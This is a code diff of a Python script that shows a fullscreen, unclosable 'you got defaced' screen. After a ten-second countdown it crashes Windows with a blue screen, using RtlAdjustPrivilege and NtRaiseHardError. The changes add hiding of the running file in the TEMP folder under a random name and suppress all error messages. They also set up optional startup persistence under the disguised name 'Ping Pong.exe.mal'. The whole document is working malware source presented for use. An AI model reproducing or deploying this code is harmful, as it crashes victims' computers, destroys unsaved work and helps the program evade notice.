@@ -5,26 +5,12 @@ import sys
 import os
 import shutil
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def run_as_admin():
-    script = os.path.abspath(sys.argv[0])
-    params = ' '.join(sys.argv[1:])
-    # Use ShellExecute with 'runas' to request admin
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
-    sys.exit()
-
-def trigger_real_bsod():
+def trigger_bsod():
     # Load ntdll.dll
     ntdll = ctypes.windll.ntdll
 
     # Define types
-    class BOOLEAN(ctypes.c_byte):
-        pass
+    BOOLEAN = ctypes.c_byte
 
     # RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled)
     RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
@@ -39,7 +25,6 @@ def trigger_real_bsod():
 
     result = RtlAdjustPrivilege(privilege, enable, current_thread, ctypes.byref(was_enabled))
     if result != 0:
-        print(f"Failed to adjust privilege. Error code: {result}")
         return
 
     # NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
@@ -52,36 +37,54 @@ def trigger_real_bsod():
     error_status = 0xC0000135
     response = ctypes.c_ulong(0)
     # Parameters: error, 0 params, 0 mask, null params, option 6 (Shutdown), response pointer
-    result = NtRaiseHardError(error_status, 0, 0, None, 6, ctypes.byref(response))
+    NtRaiseHardError(error_status, 0, 0, None, 6, ctypes.byref(response))
 
-    if result != 0:
-        print(f"NtRaiseHardError failed with code: {result}")
+def remove_file():
+    # Get the correct path depending on if it's packaged or a script
+    if getattr(sys, 'frozen', False):
+        file_path = sys.executable
     else:
-        print("BSOD triggered. System should crash now.")
+        file_path = os.path.abspath(sys.argv[0])
+
+    if not os.path.exists(file_path):
+        return
+
+    # Instantly hide the file by moving it to the TEMP folder
+    new_path = file_path
+    try:
+        import tempfile, random
+        temp_name = f"sys_{random.randint(1000, 9999)}.tmp"
+        temp_path = os.path.join(tempfile.gettempdir(), temp_name)
+        os.rename(file_path, temp_path)
+        new_path = temp_path
+    except Exception:
+        pass
 
 def add_to_startup():
     try:
         if getattr(sys, 'frozen', False):
-            # If packaged as exe
             exe_path = sys.executable
         else:
             exe_path = os.path.abspath(sys.argv[0])
 
         startup_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        dest_name = "BSOD.exe"  # change as you like
+        dest_name = "Ping Pong.exe.mal" # change as you like (remove .mal for auto trigger on reboot)
         dest_path = os.path.join(startup_dir, dest_name)
 
         shutil.copy2(exe_path, dest_path)
-        print(f"Copied to startup: {dest_path}")
     except Exception as e:
-        print(f"Failed to add to startup: {e}")
+        pass
 
 def main():
+    remove_file()
     window = tk.Tk()
     window.title("")
     window.configure(bg="black")
     window.attributes('-fullscreen', True)
     window.attributes('-topmost', True)
+    window.protocol("WM_DELETE_WINDOW", lambda: None)
+    window.overrideredirect(True)
+    window.bind("<Alt-F4>", lambda e: "break")
 
     seconds_remaining = 10
 
@@ -99,13 +102,13 @@ def main():
         img = tk.PhotoImage(file=img_path)
         img = img.subsample(3, 3)
     except Exception as e:
-        print(f"Failed to load image: {e}")
         img = None
 
     # Text
-    header = "Oops! Looks like you got defaced!"
+    header = "Greetings from Blue Cyber Sleuth"
     subheader = "By Fan2K"
-    body_template = "Don't worry, it will be back in {} seconds"
+    body_title = "Oops! looks like you got Defaced"
+    body_text = "Don't worry, it will be back in {} seconds"
 
     # Fonts
     title_font = tkfont.Font(family="Helvetica", size=32, weight="bold")
@@ -133,12 +136,15 @@ def main():
     header_frame.config(width=header_label.winfo_width(), height=header_label.winfo_height())
 
     sub_label = tk.Label(main_frame, text=subheader, fg="red", bg="black", font=sub_font)
-    sub_label.pack(pady=(0, 20))
+    sub_label.pack(pady=(0, 10))
+
+    body_title_label = tk.Label(main_frame, text=body_title, fg="white", bg="black", font=body_font)
+    body_title_label.pack(pady=(0, 10))
 
     body_frame = tk.Frame(main_frame, bg="black")
     body_frame.pack(expand=True, fill="both")
 
-    body_label = tk.Label(body_frame, text=body_template.format(seconds_remaining), fg="white", bg="black", font=body_font, justify="center", anchor="n", wraplength=1)
+    body_label = tk.Label(body_frame, text=body_text.format(seconds_remaining), fg="white", bg="black", font=body_font, justify="center", anchor="n", wraplength=1)
     body_label.pack(expand=True, fill="both")
 
     def on_resize(event):
@@ -150,22 +156,17 @@ def main():
     def countdown():
         nonlocal seconds_remaining
         if seconds_remaining > 0:
-            body_label.config(text=body_template.format(seconds_remaining))
+            body_label.config(text=body_text.format(seconds_remaining))
             seconds_remaining -= 1
             window.after(1000, countdown)
         else:
             # Close UI and trigger BSOD
             window.destroy()
-            trigger_real_bsod()
+            trigger_bsod()
 
     countdown()
     window.mainloop()
 
 if __name__ == "__main__":
-    if not is_admin():
-        print("Not running as administrator. Relaunching with admin rights...")
-        # run_as_admin()
-    else:
-        print("Running as administrator.")
-        main()
+    # add_to_startup() # (comment this line if you don't want to add to startup)
     main()
